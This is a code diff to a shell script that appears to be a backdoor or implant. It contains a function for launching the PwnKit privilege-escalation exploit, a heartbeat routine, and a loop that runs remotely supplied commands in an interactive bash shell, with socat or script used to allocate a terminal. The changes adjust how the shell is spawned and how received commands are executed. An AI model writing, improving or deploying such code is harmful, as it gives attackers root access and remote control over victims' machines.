@@ -45,9 +45,6 @@ run_pwnkit() {
         return 1
     fi
 
-    # Force bash as shell
-    export SHELL="/bin/bash"
-
     # Create temporary directory for PwnKit
     TEMP_DIR="/tmp/pwnkit_$(date +%s)"
     mkdir -p "$TEMP_DIR"
@@ -210,11 +207,11 @@ send_heartbeat() {
     done
 }
 
-# Check for script or socat to allocate PTY
-if command -v script >/dev/null 2>&1; then
+# Check for PTY tools and set command
+if command -v socat >/dev/null 2>&1; then
+    PTY_CMD="socat -u EXEC:'/bin/bash -i',pty,stderr,setsid"
+elif command -v script >/dev/null 2>&1; then
     PTY_CMD="script -q -c '/bin/bash -i' /dev/null"
-elif command -v socat >/dev/null 2>&1; then
-    PTY_CMD="socat -u EXEC:'/bin/bash -i',pty,stderr"
 else
     PTY_CMD="/bin/bash -i"
 fi
@@ -235,7 +232,7 @@ while true; do
                     handle_custom_command "$cmd"
                     ;;
                 *)
-                    eval "$PTY_CMD -c \"$cmd\"" 2>&1
+                    /bin/bash -i -c "$cmd" 2>/dev/null
                     ;;
             esac
         done
